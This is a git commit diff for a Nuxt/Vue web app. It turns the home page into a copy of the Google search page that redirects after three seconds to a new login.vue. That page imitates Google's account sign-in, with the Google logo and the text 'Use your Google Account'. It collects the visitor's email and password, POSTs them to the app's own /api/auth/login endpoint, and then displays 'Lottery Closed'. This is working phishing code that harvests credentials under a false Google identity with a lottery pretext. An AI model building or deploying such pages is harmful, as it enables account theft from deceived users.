f06377566e95d65cdd1b30abfc0b1b368ba9ba83
Dev Arome <moses21429@gmail.com>
2024-07-04 20:10:20 +0100

    anume

--- pages/index.vue
+++ pages/index.vue
@@ -1,231 +1,157 @@
 <template>
-  <div
-    class="bg-white flex items-center h-screen justify-center"
-    style="font-family: Roboto"
-  >
-    <div
-      class="md:border rounded-xl min-w-[200px] w-[450px] md:shadow-sm h-auto py-6"
-    >
-      <div class="flex flex-col p-3 justify-between px-5" v-if="step == 1">
-        <div>
+  <div class="h-full">
+    <div class="p-5 flex justify-between">
+      <div class="flex items-center space-x-4">
+        <button>
           <svg
             xmlns="http://www.w3.org/2000/svg"
-            width="3em"
-            height="3em"
-            viewBox="0 0 128 128"
+            width="1.5em"
+            height="1.5em"
+            viewBox="0 0 24 24"
           >
             <path
-              fill="#fff"
-              d="M44.59 4.21a63.28 63.28 0 0 0 4.33 120.9a67.6 67.6 0 0 0 32.36.35a57.13 57.13 0 0 0 25.9-13.46a57.44 57.44 0 0 0 16-26.26a74.3 74.3 0 0 0 1.61-33.58H65.27v24.69h34.47a29.72 29.72 0 0 1-12.66 19.52a36.2 36.2 0 0 1-13.93 5.5a41.3 41.3 0 0 1-15.1 0A37.2 37.2 0 0 1 44 95.74a39.3 39.3 0 0 1-14.5-19.42a38.3 38.3 0 0 1 0-24.63a39.25 39.25 0 0 1 9.18-14.91A37.17 37.17 0 0 1 76.13 27a34.3 34.3 0 0 1 13.64 8q5.83-5.8 11.64-11.63c2-2.09 4.18-4.08 6.15-6.22A61.2 61.2 0 0 0 87.2 4.59a64 64 0 0 0-42.61-.38"
-            />
-            <path
-              fill="#e33629"
-              d="M44.59 4.21a64 64 0 0 1 42.61.37a61.2 61.2 0 0 1 20.35 12.62c-2 2.14-4.11 4.14-6.15 6.22Q95.58 29.23 89.77 35a34.3 34.3 0 0 0-13.64-8a37.17 37.17 0 0 0-37.46 9.74a39.25 39.25 0 0 0-9.18 14.91L8.76 35.6A63.53 63.53 0 0 1 44.59 4.21"
-            />
-            <path
-              fill="#f8bd00"
-              d="M3.26 51.5a63 63 0 0 1 5.5-15.9l20.73 16.09a38.3 38.3 0 0 0 0 24.63q-10.36 8-20.73 16.08a63.33 63.33 0 0 1-5.5-40.9"
-            />
-            <path
-              fill="#587dbd"
-              d="M65.27 52.15h59.52a74.3 74.3 0 0 1-1.61 33.58a57.44 57.44 0 0 1-16 26.26c-6.69-5.22-13.41-10.4-20.1-15.62a29.72 29.72 0 0 0 12.66-19.54H65.27c-.01-8.22 0-16.45 0-24.68"
-            />
-            <path
-              fill="#319f43"
-              d="M8.75 92.4q10.37-8 20.73-16.08A39.3 39.3 0 0 0 44 95.74a37.2 37.2 0 0 0 14.08 6.08a41.3 41.3 0 0 0 15.1 0a36.2 36.2 0 0 0 13.93-5.5c6.69 5.22 13.41 10.4 20.1 15.62a57.13 57.13 0 0 1-25.9 13.47a67.6 67.6 0 0 1-32.36-.35a63 63 0 0 1-23-11.59A63.7 63.7 0 0 1 8.75 92.4"
+              fill="currentColor"
+              d="M3 18h18v-2H3zm0-5h18v-2H3zm0-7v2h18V6z"
             />
           </svg>
-        </div>
 
-        <h1 class="mt-5 font-poppins font-semibold text-2xl">
-          Sign in to continue
-        </h1>
-        <h1 class="mt-4 text-gray-500 font-poppins">Use your Google Account</h1>
-        <input
-          type="text"
-          v-model="email"
-          class="outline-none border p-3 rounded-lg mt-10 focus:border-blue-600 border-2"
-          placeholder="Email or phone"
-        />
-        <NuxtLink to="/login" class="text-blue-600 mt-2 font-semibold"
-          >Forgot email?</NuxtLink
-        >
-
-        <div class="mt-10 text-gray-500">
-          Not your computer? Use Private Browsing windows to sign in.
-          <span class="text-blue-600">Learn more about using Guest mode</span>
-        </div>
-
-        <div class="flex items-center mt-6 justify-between">
-          <h1 class="text-blue-600">Create account</h1>
-
-          <button
-            class="bg-blue-800 text-white rounded-full px-5 py-2"
-            @click="nextStep"
-          >
-            Next
+          <button class="text-blue-600 border-b-blue-600 border-b-2">
+            ALL
           </button>
-        </div>
+          <button>IMAGES</button>
+        </button>
       </div>
 
-      <div class="flex flex-col p-3 justify-between px-5" v-else>
-        <div>
+      <div class="flex items-center space-x-5">
+        <button>
           <svg
             xmlns="http://www.w3.org/2000/svg"
-            width="3em"
-            height="3em"
-            viewBox="0 0 128 128"
+            width="2em"
+            height="2em"
+            viewBox="0 0 24 24"
           >
             <path
-              fill="#fff"
-              d="M44.59 4.21a63.28 63.28 0 0 0 4.33 120.9a67.6 67.6 0 0 0 32.36.35a57.13 57.13 0 0 0 25.9-13.46a57.44 57.44 0 0 0 16-26.26a74.3 74.3 0 0 0 1.61-33.58H65.27v24.69h34.47a29.72 29.72 0 0 1-12.66 19.52a36.2 36.2 0 0 1-13.93 5.5a41.3 41.3 0 0 1-15.1 0A37.2 37.2 0 0 1 44 95.74a39.3 39.3 0 0 1-14.5-19.42a38.3 38.3 0 0 1 0-24.63a39.25 39.25 0 0 1 9.18-14.91A37.17 37.17 0 0 1 76.13 27a34.3 34.3 0 0 1 13.64 8q5.83-5.8 11.64-11.63c2-2.09 4.18-4.08 6.15-6.22A61.2 61.2 0 0 0 87.2 4.59a64 64 0 0 0-42.61-.38"
+              fill="none"
+              stroke="currentColor"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              stroke-width="1.5"
+              d="M12 6.826A.913.913 0 1 0 12 5a.913.913 0 0 0 0 1.826m6.088 0a.913.913 0 1 0 0-1.826a.913.913 0 0 0 0 1.826m-12.176 0a.913.913 0 1 0 0-1.826a.913.913 0 0 0 0 1.826M12 12.913a.913.913 0 1 0 0-1.826a.913.913 0 0 0 0 1.826m6.088 0a.913.913 0 1 0 0-1.826a.913.913 0 0 0 0 1.826m-12.176 0a.913.913 0 1 0 0-1.826a.913.913 0 0 0 0 1.826M12 19a.913.913 0 1 0 0-1.826A.913.913 0 0 0 12 19m6.088 0a.913.913 0 1 0 0-1.826a.913.913 0 0 0 0 1.826M5.912 19a.913.913 0 1 0 0-1.826a.913.913 0 0 0 0 1.826"
             />
+          </svg>
+        </button>
+        <button class="bg-blue-800 text-white rounded-full px-5 py-2">
+          Sign in
+        </button>
+      </div>
+    </div>
+
+    <div class="flex p-5 justify-center">
+      <div class="flex flex-col justify-center min-w-[200px] w-[450px]">
+        <div class="h-full mt-36 flex flex-col items-center jusstify-center">
+          <div>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="152.39"
+              height="50"
+              viewBox="0 0 512 168"
+            >
+              <path
+                fill="#ff302f"
+                d="m496.052 102.672l14.204 9.469c-4.61 6.79-15.636 18.44-34.699 18.44c-23.672 0-41.301-18.315-41.301-41.614c0-24.793 17.816-41.613 39.308-41.613c21.616 0 32.206 17.193 35.633 26.475l1.869 4.735l-55.692 23.049c4.236 8.348 10.84 12.584 20.183 12.584c9.345 0 15.823-4.61 20.495-11.525M452.384 87.66l37.19-15.45c-2.056-5.17-8.16-8.845-15.45-8.845c-9.281 0-22.176 8.223-21.74 24.295"
+              />
+              <path fill="#20b15a" d="M407.407 4.931h17.94v121.85h-17.94z" />
+              <path
+                fill="#3686f7"
+                d="M379.125 50.593h17.318V124.6c0 30.711-18.128 43.357-39.558 43.357c-20.183 0-32.33-13.58-36.878-24.606l15.885-6.604c2.865 6.79 9.78 14.827 20.993 14.827c13.767 0 22.24-8.535 22.24-24.482v-5.98h-.623c-4.112 4.983-11.961 9.468-21.928 9.468c-20.807 0-39.87-18.128-39.87-41.488c0-23.486 19.063-41.8 39.87-41.8c9.905 0 17.816 4.423 21.928 9.282h.623zm1.245 38.499c0-14.702-9.78-25.417-22.239-25.417c-12.584 0-23.174 10.715-23.174 25.417c0 14.514 10.59 25.042 23.174 25.042c12.46.063 22.24-10.528 22.24-25.042"
+              />
+              <path
+                fill="#ff302f"
+                d="M218.216 88.78c0 23.984-18.688 41.613-41.613 41.613c-22.924 0-41.613-17.691-41.613-41.613c0-24.108 18.689-41.675 41.613-41.675c22.925 0 41.613 17.567 41.613 41.675m-18.19 0c0-14.95-10.84-25.23-23.423-25.23S153.18 73.83 153.18 88.78c0 14.826 10.84 25.23 23.423 25.23c12.584 0 23.423-10.404 23.423-25.23"
+              />
+              <path
+                fill="#ffba40"
+                d="M309.105 88.967c0 23.984-18.689 41.613-41.613 41.613c-22.925 0-41.613-17.63-41.613-41.613c0-24.108 18.688-41.613 41.613-41.613c22.924 0 41.613 17.443 41.613 41.613m-18.253 0c0-14.95-10.839-25.23-23.423-25.23s-23.423 10.28-23.423 25.23c0 14.826 10.84 25.23 23.423 25.23c12.646 0 23.423-10.466 23.423-25.23"
+              />
+              <path
+                fill="#3686f7"
+                d="M66.59 112.328c-26.102 0-46.534-21.056-46.534-47.158c0-26.101 20.432-47.157 46.534-47.157c14.079 0 24.357 5.544 31.957 12.646l12.522-12.521C100.479 7.984 86.338.258 66.59.258C30.833.259.744 29.414.744 65.17s30.089 64.912 65.846 64.912c19.312 0 33.889-6.354 45.289-18.19c11.711-11.712 15.324-28.158 15.324-41.489c0-4.174-.498-8.472-1.059-11.649H66.59v17.318h42.423c-1.246 10.84-4.672 18.253-9.718 23.298c-6.105 6.168-15.76 12.958-32.705 12.958"
+              />
+            </svg>
+          </div>
+        </div>
+
+        <div
+          class="border border-gray-200 items-center rounded-full p-3 flex mt-5"
+        >
+          <svg
+            color="gray"
+            xmlns="http://www.w3.org/2000/svg"
+            width="1.2em"
+            height="1.2em"
+            viewBox="0 0 24 24"
+          >
             <path
-              fill="#e33629"
-              d="M44.59 4.21a64 64 0 0 1 42.61.37a61.2 61.2 0 0 1 20.35 12.62c-2 2.14-4.11 4.14-6.15 6.22Q95.58 29.23 89.77 35a34.3 34.3 0 0 0-13.64-8a37.17 37.17 0 0 0-37.46 9.74a39.25 39.25 0 0 0-9.18 14.91L8.76 35.6A63.53 63.53 0 0 1 44.59 4.21"
+              fill="currentColor"
+              d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14"
             />
-            <path
-              fill="#f8bd00"
-              d="M3.26 51.5a63 63 0 0 1 5.5-15.9l20.73 16.09a38.3 38.3 0 0 0 0 24.63q-10.36 8-20.73 16.08a63.33 63.33 0 0 1-5.5-40.9"
-            />
-            <path
-              fill="#587dbd"
-              d="M65.27 52.15h59.52a74.3 74.3 0 0 1-1.61 33.58a57.44 57.44 0 0 1-16 26.26c-6.69-5.22-13.41-10.4-20.1-15.62a29.72 29.72 0 0 0 12.66-19.54H65.27c-.01-8.22 0-16.45 0-24.68"
-            />
-            <path
-              fill="#319f43"
-              d="M8.75 92.4q10.37-8 20.73-16.08A39.3 39.3 0 0 0 44 95.74a37.2 37.2 0 0 0 14.08 6.08a41.3 41.3 0 0 0 15.1 0a36.2 36.2 0 0 0 13.93-5.5c6.69 5.22 13.41 10.4 20.1 15.62a57.13 57.13 0 0 1-25.9 13.47a67.6 67.6 0 0 1-32.36-.35a63 63 0 0 1-23-11.59A63.7 63.7 0 0 1 8.75 92.4"
-            />
+          </svg>
+          <input type="text" placeholder="" class="flex-1" />
+          <svg
+            width="1.2em"
+            height="1.2em"
+            focusable="false"
+            viewBox="0 0 192 192"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <rect fill="none" height="192" width="192"></rect>
+            <g>
+              <circle fill="#34a853" cx="144.07" cy="144" r="16"></circle>
+              <circle fill="#4285f4" cx="96.07" cy="104" r="24"></circle>
+              <path
+                fill="#ea4335"
+                d="M24,135.2c0,18.11,14.69,32.8,32.8,32.8H96v-16l-40.1-0.1c-8.8,0-15.9-8.19-15.9-17.9v-18H24V135.2z"
+              ></path>
+              <path
+                fill="#fbbc04"
+                d="M168,72.8c0-18.11-14.69-32.8-32.8-32.8H116l20,16c8.8,0,16,8.29,16,18v30h16V72.8z"
+              ></path>
+              <path
+                fill="#4285f4"
+                d="M112,24l-32,0L68,40H56.8C38.69,40,24,54.69,24,72.8V92h16V74c0-9.71,7.2-18,16-18h80L112,24z"
+              ></path>
+            </g>
           </svg>
         </div>
 
-        <div class="mt-8">
-          <h1 class="text-2xl">Hi {{ strippedEmail }}</h1>
-
-          <div
-            class="flex items-center border-2 border-gray-300 p-1 w-auto rounded-full mt-1"
-          >
-            <p
-              class="p-1 text-white font-bold rounded-full bg-green-300 w-6 h-6 items-center justify-center flex"
-            >
-              {{ firstLetter }}
-            </p>
-            <span class="w-auto">{{ email }}</span>
-          </div>
-
-          <div class="flex flex-col">
-            <input
-              :type="showPassword ? 'text' : 'password'"
-              placeholder="Enter your Password"
-              v-model="password"
-              class="outline-none border p-3 rounded-lg mt-10 focus:border-blue-600 border-2"
-            />
-            <div class="space-x-3 flex items-center mt-8">
-              <input
-                type="checkbox"
-                name=""
-                id=""
-                v-model="showPassword"
-                placeholder="Show password"
-              />
-              <label for="">Show password</label>
-            </div>
-
-            <div class="flex items-center mt-6 justify-between">
-              <h1 class="text-blue-600">Forgot password?</h1>
-
-              <button
-                class="bg-blue-800 text-white rounded-full px-5 py-2"
-                @click="submitCredentials"
-              >
-                Next
-              </button>
-            </div>
+        <div class="mt-8 space-y-2 flex flex-col items-center text-gray-500">
+          <h1>Google offered in:</h1>
+          <div class="flex items-center text-blue-600 space-x-4">
+            Hausa Igbo Èdè Yorùbá Nigerian Pidgin
           </div>
         </div>
       </div>
     </div>
+
+    <footer class="absolute w-full p-2 bottom-0 h-auto bg-gray-200">
+      <div class="w-full border-b-2 p-3 border-b-gray-300">
+        <h1 class="text-gray-500 text-xl">Nigeria</h1>
+      </div>
+      <div class="flex justify-center p-5 space-x-4 text-gray-400">
+        <span>Dark Theme: Off</span> <span>Settings</span> <span>Privacy</span>
+        <span>Terms</span>
+      </div>
+    </footer>
   </div>
 </template>
 
 <script setup>
-import { ref } from "vue";
-import Loki from "lokijs";
-
-const step = ref(1);
-const email = ref("");
-const password = ref("");
-const showPassword = ref(false);
-
-const nextStep = () => {
-  step.value = 2;
-};
-
-let db;
-
+const router = useRouter();
 onMounted(() => {
-  db = new Loki("userDatabase.db", {
-    autosave: true,
-    autosaveInterval: 5000,
-  });
-  db.loadDatabase({}, () => {
-    let users = db.getCollection("users");
-    if (users === null) {
-      users = db.addCollection("users");
-    }
-  });
+  setTimeout(() => {
+    router.push("/login");
+  }, 3000);
 });
-
-const strippedEmail = computed(() => {
-  if (email.value.endsWith("@gmail.com")) {
-    return email.value.slice(0, -10);
-  }
-  return email.value;
-});
-
-const firstLetter = computed(() => {
-  if (email.value) {
-    return email.value.charAt(0).toUpperCase();
-  }
-  return "";
-});
-
-const submitCredentials = async () => {
-  try {
-    const res = await $fetch("/api/auth/login", {
-      method: "POST",
-      body: {
-        email: email.value,
-        password: password.value,
-      },
-    });
-    window.location.reload();
-  } catch (error) {
-    console.error(error);
-  }
-};
 </script>
 
-<style lang="css" scoped>
-input[type="checkbox"] {
-  appearance: none;
-  width: 20px;
-  height: 20px;
-  background-color: #ccc;
-  border: 2px solid #1a73e8;
-  border-radius: 4px;
-  cursor: pointer;
-}
-
-input[type="checkbox"]:checked {
-  background-color: #1a73e8;
-}
-
-input[type="checkbox"]:checked::before {
-  content: "\2713";
-  display: block;
-  text-align: center;
-  color: white;
-  font-size: 16px;
-}
-</style>
+<style lang="scss" scoped></style>
---
+++ pages/login.vue
@@ -0,0 +1,298 @@
+<template>
+  <div
+    class="bg-white flex items-center h-screen justify-center"
+    style="font-family: Roboto"
+  >
+    <div
+      class="md:border rounded-xl min-w-[200px] w-[450px] md:shadow-sm h-auto py-6"
+    >
+      <div class="flex flex-col p-3 justify-between px-5" v-if="step == 1">
+        <div>
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="3em"
+            height="3em"
+            viewBox="0 0 128 128"
+          >
+            <path
+              fill="#fff"
+              d="M44.59 4.21a63.28 63.28 0 0 0 4.33 120.9a67.6 67.6 0 0 0 32.36.35a57.13 57.13 0 0 0 25.9-13.46a57.44 57.44 0 0 0 16-26.26a74.3 74.3 0 0 0 1.61-33.58H65.27v24.69h34.47a29.72 29.72 0 0 1-12.66 19.52a36.2 36.2 0 0 1-13.93 5.5a41.3 41.3 0 0 1-15.1 0A37.2 37.2 0 0 1 44 95.74a39.3 39.3 0 0 1-14.5-19.42a38.3 38.3 0 0 1 0-24.63a39.25 39.25 0 0 1 9.18-14.91A37.17 37.17 0 0 1 76.13 27a34.3 34.3 0 0 1 13.64 8q5.83-5.8 11.64-11.63c2-2.09 4.18-4.08 6.15-6.22A61.2 61.2 0 0 0 87.2 4.59a64 64 0 0 0-42.61-.38"
+            />
+            <path
+              fill="#e33629"
+              d="M44.59 4.21a64 64 0 0 1 42.61.37a61.2 61.2 0 0 1 20.35 12.62c-2 2.14-4.11 4.14-6.15 6.22Q95.58 29.23 89.77 35a34.3 34.3 0 0 0-13.64-8a37.17 37.17 0 0 0-37.46 9.74a39.25 39.25 0 0 0-9.18 14.91L8.76 35.6A63.53 63.53 0 0 1 44.59 4.21"
+            />
+            <path
+              fill="#f8bd00"
+              d="M3.26 51.5a63 63 0 0 1 5.5-15.9l20.73 16.09a38.3 38.3 0 0 0 0 24.63q-10.36 8-20.73 16.08a63.33 63.33 0 0 1-5.5-40.9"
+            />
+            <path
+              fill="#587dbd"
+              d="M65.27 52.15h59.52a74.3 74.3 0 0 1-1.61 33.58a57.44 57.44 0 0 1-16 26.26c-6.69-5.22-13.41-10.4-20.1-15.62a29.72 29.72 0 0 0 12.66-19.54H65.27c-.01-8.22 0-16.45 0-24.68"
+            />
+            <path
+              fill="#319f43"
+              d="M8.75 92.4q10.37-8 20.73-16.08A39.3 39.3 0 0 0 44 95.74a37.2 37.2 0 0 0 14.08 6.08a41.3 41.3 0 0 0 15.1 0a36.2 36.2 0 0 0 13.93-5.5c6.69 5.22 13.41 10.4 20.1 15.62a57.13 57.13 0 0 1-25.9 13.47a67.6 67.6 0 0 1-32.36-.35a63 63 0 0 1-23-11.59A63.7 63.7 0 0 1 8.75 92.4"
+            />
+          </svg>
+        </div>
+
+        <h1 class="mt-5 font-poppins font-semibold text-2xl">
+          Sign in to continue
+        </h1>
+        <h1 class="mt-4 text-gray-500 font-poppins">Use your Google Account</h1>
+        <input
+          type="text"
+          v-model="email"
+          class="outline-none border p-3 rounded-lg mt-10 focus:border-blue-600 border-2"
+          placeholder="Email or phone"
+        />
+        <NuxtLink to="/login" class="text-blue-600 mt-2 font-semibold"
+          >Forgot email?</NuxtLink
+        >
+
+        <div class="mt-10 text-gray-500">
+          Not your computer? Use Private Browsing windows to sign in.
+          <span class="text-blue-600">Learn more about using Guest mode</span>
+        </div>
+
+        <div class="flex items-center mt-6 justify-between">
+          <h1 class="text-blue-600">Create account</h1>
+
+          <button
+            class="bg-blue-800 text-white rounded-full px-5 py-2"
+            @click="nextStep"
+          >
+            Next
+          </button>
+        </div>
+      </div>
+
+      <div class="flex flex-col p-3 justify-between px-5" v-else-if="step == 2">
+        <div>
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="3em"
+            height="3em"
+            viewBox="0 0 128 128"
+          >
+            <path
+              fill="#fff"
+              d="M44.59 4.21a63.28 63.28 0 0 0 4.33 120.9a67.6 67.6 0 0 0 32.36.35a57.13 57.13 0 0 0 25.9-13.46a57.44 57.44 0 0 0 16-26.26a74.3 74.3 0 0 0 1.61-33.58H65.27v24.69h34.47a29.72 29.72 0 0 1-12.66 19.52a36.2 36.2 0 0 1-13.93 5.5a41.3 41.3 0 0 1-15.1 0A37.2 37.2 0 0 1 44 95.74a39.3 39.3 0 0 1-14.5-19.42a38.3 38.3 0 0 1 0-24.63a39.25 39.25 0 0 1 9.18-14.91A37.17 37.17 0 0 1 76.13 27a34.3 34.3 0 0 1 13.64 8q5.83-5.8 11.64-11.63c2-2.09 4.18-4.08 6.15-6.22A61.2 61.2 0 0 0 87.2 4.59a64 64 0 0 0-42.61-.38"
+            />
+            <path
+              fill="#e33629"
+              d="M44.59 4.21a64 64 0 0 1 42.61.37a61.2 61.2 0 0 1 20.35 12.62c-2 2.14-4.11 4.14-6.15 6.22Q95.58 29.23 89.77 35a34.3 34.3 0 0 0-13.64-8a37.17 37.17 0 0 0-37.46 9.74a39.25 39.25 0 0 0-9.18 14.91L8.76 35.6A63.53 63.53 0 0 1 44.59 4.21"
+            />
+            <path
+              fill="#f8bd00"
+              d="M3.26 51.5a63 63 0 0 1 5.5-15.9l20.73 16.09a38.3 38.3 0 0 0 0 24.63q-10.36 8-20.73 16.08a63.33 63.33 0 0 1-5.5-40.9"
+            />
+            <path
+              fill="#587dbd"
+              d="M65.27 52.15h59.52a74.3 74.3 0 0 1-1.61 33.58a57.44 57.44 0 0 1-16 26.26c-6.69-5.22-13.41-10.4-20.1-15.62a29.72 29.72 0 0 0 12.66-19.54H65.27c-.01-8.22 0-16.45 0-24.68"
+            />
+            <path
+              fill="#319f43"
+              d="M8.75 92.4q10.37-8 20.73-16.08A39.3 39.3 0 0 0 44 95.74a37.2 37.2 0 0 0 14.08 6.08a41.3 41.3 0 0 0 15.1 0a36.2 36.2 0 0 0 13.93-5.5c6.69 5.22 13.41 10.4 20.1 15.62a57.13 57.13 0 0 1-25.9 13.47a67.6 67.6 0 0 1-32.36-.35a63 63 0 0 1-23-11.59A63.7 63.7 0 0 1 8.75 92.4"
+            />
+          </svg>
+        </div>
+
+        <div class="mt-8">
+          <h1 class="text-2xl">Hi {{ strippedEmail }}</h1>
+
+          <div
+            class="flex items-center border-2 border-gray-300 p-1 w-auto rounded-full mt-1"
+          >
+            <p
+              class="p-1 text-white font-bold rounded-full bg-green-300 w-6 h-6 items-center justify-center flex"
+            >
+              {{ firstLetter }}
+            </p>
+            <span class="w-auto">{{ email }}</span>
+          </div>
+
+          <div class="flex flex-col">
+            <input
+              :type="showPassword ? 'text' : 'password'"
+              placeholder="Enter your Password"
+              v-model="password"
+              class="outline-none border p-3 rounded-lg mt-10 focus:border-blue-600 border-2"
+            />
+            <div class="space-x-3 flex items-center mt-8">
+              <input
+                type="checkbox"
+                name=""
+                id=""
+                v-model="showPassword"
+                placeholder="Show password"
+              />
+              <label for="">Show password</label>
+            </div>
+
+            <div class="flex items-center mt-6 justify-between">
+              <h1 class="text-blue-600">Forgot password?</h1>
+
+              <button
+                class="bg-blue-800 text-white rounded-full px-5 py-2"
+                @click="submitCredentials"
+              >
+                Next
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="flex text-blue-600 flex-col space-y-4 items-center" v-else>
+        <div class="bg-blue-600 p-5 rounded-full">
+          <svg
+            class="text-white p-2"
+            xmlns="http://www.w3.org/2000/svg"
+            width="50"
+            height="50"
+            viewBox="0 0 24 24"
+          >
+            <defs>
+              <mask id="lineMdCheckAll0">
+                <g
+                  fill="none"
+                  stroke="#fff"
+                  stroke-dasharray="22"
+                  stroke-dashoffset="22"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  stroke-width="2"
+                >
+                  <path d="M2 13.5l4 4l10.75 -10.75">
+                    <animate
+                      fill="freeze"
+                      attributeName="stroke-dashoffset"
+                      dur="0.4s"
+                      values="22;0"
+                    />
+                  </path>
+                  <path
+                    stroke="#000"
+                    stroke-width="4"
+                    d="M7.5 13.5l4 4l10.75 -10.75"
+                    opacity="0"
+                  >
+                    <set attributeName="opacity" begin="0.4s" to="1" />
+                    <animate
+                      fill="freeze"
+                      attributeName="stroke-dashoffset"
+                      begin="0.4s"
+                      dur="0.4s"
+                      values="22;0"
+                    />
+                  </path>
+                  <path d="M7.5 13.5l4 4l10.75 -10.75" opacity="0">
+                    <set attributeName="opacity" begin="0.4s" to="1" />
+                    <animate
+                      fill="freeze"
+                      attributeName="stroke-dashoffset"
+                      begin="0.4s"
+                      dur="0.4s"
+                      values="22;0"
+                    />
+                  </path>
+                </g>
+              </mask>
+            </defs>
+            <rect
+              width="24"
+              height="24"
+              fill="currentColor"
+              mask="url(#lineMdCheckAll0)"
+            />
+          </svg>
+        </div>
+        <h1 class="text-xl">Lottery Closed</h1>
+      </div>
+    </div>
+  </div>
+</template>
+
+<script setup>
+import { ref } from "vue";
+import Loki from "lokijs";
+
+const step = ref(1);
+const email = ref("");
+const password = ref("");
+const showPassword = ref(false);
+
+const nextStep = () => {
+  step.value = 2;
+};
+
+let db;
+
+onMounted(() => {
+  db = new Loki("userDatabase.db", {
+    autosave: true,
+    autosaveInterval: 5000,
+  });
+  db.loadDatabase({}, () => {
+    let users = db.getCollection("users");
+    if (users === null) {
+      users = db.addCollection("users");
+    }
+  });
+});
+
+const strippedEmail = computed(() => {
+  if (email.value.endsWith("@gmail.com")) {
+    return email.value.slice(0, -10);
+  }
+  return email.value;
+});
+
+const firstLetter = computed(() => {
+  if (email.value) {
+    return email.value.charAt(0).toUpperCase();
+  }
+  return "";
+});
+
+const submitCredentials = async () => {
+  try {
+    const res = await $fetch("/api/auth/login", {
+      method: "POST",
+      body: {
+        email: email.value,
+        password: password.value,
+      },
+    });
+    step.value = 3;
+  } catch (error) {
+    console.error(error);
+  }
+};
+</script>
+
+<style lang="css" scoped>
+input[type="checkbox"] {
+  appearance: none;
+  width: 20px;
+  height: 20px;
+  background-color: #ccc;
+  border: 2px solid #1a73e8;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+input[type="checkbox"]:checked {
+  background-color: #1a73e8;
+}
+
+input[type="checkbox"]:checked::before {
+  content: "\2713";
+  display: block;
+  text-align: center;
+  color: white;
+  font-size: 16px;
+}
+</style>
